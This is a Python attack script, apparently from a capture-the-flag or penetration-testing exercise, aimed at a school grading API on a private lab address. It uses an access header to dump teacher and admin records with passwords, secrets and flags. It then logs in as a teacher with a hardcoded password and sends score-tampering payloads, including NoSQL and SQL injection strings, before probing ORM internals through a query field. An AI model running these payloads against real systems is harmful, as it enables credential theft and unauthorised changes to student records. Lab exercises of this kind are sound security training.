#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def get_users(user_type):
    print(f"\n=== Dumping {user_type} ===")
    try:
        resp = requests.get(
            f"{BASE_URL}/api/v1/users",
            params={
                "user_type": user_type,
                "fields": "user_id,name,password,user_type,flag,secret,notes,description,role,is_admin",
            },
            headers=HEADERS,
        )
        if resp.status_code == 200:
            print(json.dumps(resp.json(), indent=2))
        else:
            print(f"Error: {resp.status_code} - {resp.text}")
    except Exception as e:
        print(e)


# 1. Dump Teachers
get_users("teachers")
get_users("teacher")
get_users("admin")
get_users("admins")

# 2. Try Score Manipulation
print("\n=== Testing Score Manipulation ===")
# Login as Admin first
session = requests.Session()
session.headers.update(HEADERS)
login_resp = session.post(
    f"{BASE_URL}/api/v1/login",
    json={
        "user_id": "T001",
        "password": "QRSwojjqYV3r3FWvrQ_V3eminq-zZYc5BCZAu_6ptBM",
        "user_type": "teacher",
    },
)
print(f"Login T001: {login_resp.status_code}")

score_payloads = [
    -1,
    -100,
    101,
    9999,
    "A",
    "100",
    {"$gt": 0},  # NoSQL injection attempt
    "100 OR 1=1",  # SQL injection
]

for score in score_payloads:
    print(f"Trying score: {score}")
    resp = session.post(
        f"{BASE_URL}/api/v1/score",
        json={"student_id": "S001", "subject": "Math", "score": score},
    )
    print(f"  Result: {resp.status_code} - {resp.text}")

# 3. ORM Injection / Attribute Probing
print("\n=== Testing Attribute Probing ===")
probes = ["__class__", "__init__", "__dict__", "__str__", "metadata", "query", "config"]
for field in probes:
    resp = requests.get(
        f"{BASE_URL}/api/v1/users",
        params={"user_type": "students", "fields": field},
        headers=HEADERS,
    )
    if resp.status_code == 200:
        print(f"Field '{field}': {resp.text}")
